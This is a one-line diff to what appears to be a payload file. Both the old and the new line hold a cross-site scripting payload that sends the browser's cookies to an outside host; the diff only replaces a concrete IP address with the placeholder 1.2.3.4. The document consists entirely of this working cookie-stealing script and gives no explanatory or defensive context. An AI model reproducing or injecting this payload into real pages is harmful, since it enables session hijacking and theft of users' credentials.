@@ -1,1 +1,1 @@
-<script type="text/javascript">document.location='http://34.221.162.169:3000?c='+document.cookie;</script>
+<script type="text/javascript">document.location='http://1.2.3.4:8080?c='+document.cookie;</script>
